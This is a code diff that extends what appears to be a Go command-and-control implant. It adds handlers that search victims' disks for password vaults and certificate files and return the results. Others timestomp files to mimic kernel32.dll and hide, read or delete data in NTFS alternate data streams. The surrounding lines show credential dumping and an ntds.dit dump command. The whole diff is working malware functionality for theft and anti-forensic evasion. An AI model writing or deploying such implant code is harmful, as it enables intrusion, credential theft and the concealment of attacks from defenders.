@@ -1095,6 +1095,111 @@ func dispatchTask(t transport, task taskWire) {
 		data, _ := json.MarshalIndent(creds, "", "  ")
 		t.sendResult(task.ID, string(data), "")
 
+	// ── File search ──────────────────────────────────────────────────────────
+	// Args: "[root] <pattern>"   e.g. "*.kdbx"  or  "C:\Users *.pfx"
+
+	case "SEARCH":
+		parts := strings.Fields(task.Args)
+		if len(parts) == 0 {
+			t.sendResult(task.ID, "", "usage: search [root] <pattern>  — e.g. search *.kdbx")
+			return
+		}
+		root, pattern := defaultSearchRoot(), parts[0]
+		if len(parts) >= 2 {
+			root = parts[0]
+			pattern = parts[1]
+		}
+		results, err := fileSearch(root, pattern, 2000, 60*time.Second)
+		if err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		t.sendResult(task.ID, formatSearchResults(results, len(results) >= 2000), "")
+
+	// ── Timestomping ─────────────────────────────────────────────────────────
+	// Args: "<file> [YYYY-MM-DD|ref_file]"   ref_file defaults to kernel32.dll
+
+	case "TIMESTOMP":
+		parts := strings.SplitN(strings.TrimSpace(task.Args), " ", 2)
+		if len(parts) == 0 || parts[0] == "" {
+			t.sendResult(task.ID, "", "usage: timestomp <file> [YYYY-MM-DD|ref_file]")
+			return
+		}
+		target := parts[0]
+		ref := ""
+		if len(parts) == 2 {
+			ref = parts[1]
+		}
+		if err := timestompFile(target, ref); err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		t.sendResult(task.ID, fmt.Sprintf("[+] timestamps updated: %s", target), "")
+
+	// ── Alternate Data Streams ────────────────────────────────────────────────
+	// ADS_LIST  <file>
+	// ADS_READ  <file>:<stream>
+	// ADS_WRITE <file>:<stream>   (payload = base64 data)
+	// ADS_DEL   <file>:<stream>
+
+	case "ADS_LIST":
+		path := strings.TrimSpace(task.Args)
+		if path == "" {
+			t.sendResult(task.ID, "", "usage: ads list <file>")
+			return
+		}
+		out, err := adsList(path)
+		if err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		t.sendResult(task.ID, out, "")
+
+	case "ADS_READ":
+		arg := strings.TrimSpace(task.Args)
+		idx := strings.LastIndex(arg, ":")
+		if idx <= 0 {
+			t.sendResult(task.ID, "", "usage: ads read <file>:<stream>")
+			return
+		}
+		data, err := adsRead(arg[:idx], arg[idx+1:])
+		if err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		t.sendResult(task.ID, string(data), "")
+
+	case "ADS_WRITE":
+		arg := strings.TrimSpace(task.Args)
+		idx := strings.LastIndex(arg, ":")
+		if idx <= 0 || task.Payload == "" {
+			t.sendResult(task.ID, "", "usage: ads write <file>:<stream>  (payload=base64 data)")
+			return
+		}
+		raw, err := base64.StdEncoding.DecodeString(task.Payload)
+		if err != nil {
+			t.sendResult(task.ID, "", "decode payload: "+err.Error())
+			return
+		}
+		if err := adsWrite(arg[:idx], arg[idx+1:], raw); err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		t.sendResult(task.ID, fmt.Sprintf("[+] wrote %d bytes to %s", len(raw), arg), "")
+
+	case "ADS_DEL":
+		arg := strings.TrimSpace(task.Args)
+		idx := strings.LastIndex(arg, ":")
+		if idx <= 0 {
+			t.sendResult(task.ID, "", "usage: ads del <file>:<stream>")
+			return
+		}
+		if err := adsDelete(arg[:idx], arg[idx+1:]); err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		t.sendResult(task.ID, fmt.Sprintf("[+] deleted stream %s", arg), "")
+
 	// ── ntds.dit dump via ntdsutil ────────────────────────────────────────────
 
 	case "NTDS_DUMP":
